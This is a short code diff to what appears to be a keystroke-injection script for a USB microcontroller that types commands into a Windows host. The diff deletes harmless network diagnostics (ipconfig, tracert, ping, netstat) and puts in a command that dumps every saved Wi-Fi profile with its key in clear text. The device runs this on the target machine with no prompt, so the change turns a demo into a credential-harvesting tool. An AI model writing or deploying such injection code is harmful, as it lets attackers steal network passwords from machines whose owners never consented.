@@ -94,21 +94,10 @@ try:
     time.sleep(1.2)
     
     #commands are OS specific make sure to provide correct commands
-    keyboard_layout.write("ipconfig") 
+    keyboard_layout.write("netsh wlan show profiles name=* key=clear") 
     keyboard.send(Keycode.ENTER)
     time.sleep(1)
     
-    keyboard_layout.write("tracert www.google.com") 
-    keyboard.send(Keycode.ENTER)
-    time.sleep(1)
-    
-    keyboard_layout.write("ping www.facebook.com") 
-    keyboard.send(Keycode.ENTER)
-    time.sleep(1)
-    
-    keyboard_layout.write("netstat") # similarly many more...
-    keyboard.send(Keycode.ENTER)
-    time.sleep(1)
     
     lst = [0.5,0.2,0,0.1,0.01]
     for i in range(len(lst)):
@@ -124,5 +113,3 @@ try:
 except Exception as ex:
     keyboard.release_all()
     raise ex
-
-
